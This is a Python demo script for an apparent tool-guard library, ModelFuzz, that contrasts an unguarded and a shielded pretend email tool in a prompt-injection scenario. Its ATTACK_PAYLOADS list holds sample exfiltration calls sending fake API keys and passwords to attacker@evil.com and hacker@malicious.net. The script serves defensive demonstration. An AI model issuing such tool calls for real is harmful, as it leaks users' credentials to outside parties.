"""Demo script showing ModelFuzz blocking a data exfiltration attack."""

from modelfuzz import ModelFuzzBlockError, shield_tool

# --- ANSI Color Codes ---
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def print_separator(title: str, color: str = CYAN) -> None:
    """Print a visually distinct separator block."""
    print(f"\n{color}{BOLD}{'=' * 60}{RESET}")
    print(f"{color}{BOLD} {title} {RESET}")
    print(f"{color}{BOLD}{'=' * 60}{RESET}\n")


def print_summary_box(title: str, message: str, color: str) -> None:
    """Print a color-coded summary box."""
    print(f"\n{color}{BOLD}{'=' * 60}{RESET}")
    print(f"{color}{BOLD}  {title}{RESET}")
    print(f"{color}{BOLD}{'=' * 60}{RESET}")
    print(f"{color}  {message}{RESET}")
    print(f"{color}{BOLD}{'=' * 60}{RESET}\n")


# --- Tool Definition (Unguarded) ---
def send_email_unguarded(to_address: str, subject: str, body: str) -> None:
    """Pretend tool that sends an email. VULNERABLE."""
    print(f"  To: {to_address}")
    print(f"  Subject: {subject}")
    print(f"  Body: {body}")


# --- Tool Definition (Guarded) ---
@shield_tool()
def send_email_guarded(to_address: str, subject: str, body: str) -> None:
    """Pretend tool that sends an email. SHIELDED."""
    print(f"  To: {to_address}")
    print(f"  Subject: {subject}")
    print(f"  Body: {body}")


# --- Attack Payloads ---
ATTACK_PAYLOADS = [
    {
        "to_address": "attacker@evil.com",
        "subject": "Stolen Data",
        "body": "The user's API_KEY is sk-12345...",
    },
    {
        "to_address": "hacker@malicious.net",
        "subject": "Exfiltration",
        "body": "Secret credentials attached: password123",
    },
]


def main() -> None:
    print_separator("MODELFUZZ DEMO: PROMPT INJECTION DEFENSE", YELLOW)

    # --- Part 1: The Breach ---
    print_separator("PART 1: THE BREACH (UNGUARDED)", RED)
    payload1 = ATTACK_PAYLOADS[0]
    print(f"{RED}[!] UNGUARDED AGENT: Executing tool with malicious payload...{RESET}")
    print(f"{RED}  [>] Tool Call: send_email(**{payload1}){RESET}\n")
    print(f"{RED}  [!] Simulating email send...{RESET}")
    send_email_unguarded(**payload1)
    print_summary_box("🚨 BREACH", "Data exfiltrated to attacker@evil.com", RED)

    # --- Part 2: The Shield ---
    print_separator("PART 2: THE SHIELD (MODELFUZZ ACTIVE)", GREEN)
    payload2 = ATTACK_PAYLOADS[1]  # Using a different payload for variety, but same intent
    print(f"{GREEN}[+] GUARDED AGENT: Executing tool with malicious payload...{RESET}")
    print(f"{GREEN}  [>] Tool Call: send_email(**{payload2}){RESET}\n")
    print(f"{GREEN}  [+] ModelFuzz is intercepting the call...{RESET}")

    try:
        send_email_guarded(**payload2)
    except ModelFuzzBlockError as e:
        print(f"{GREEN}\n  [✓] ModelFuzz caught a violation:{RESET}")
        print(f"{GREEN}      Reason: {e}{RESET}")
        print_summary_box(
            "🛡️ MODELFUZZ BLOCKED",
            "Sensitive data exfiltration stopped.",
            GREEN,
        )


if __name__ == "__main__":
    main()
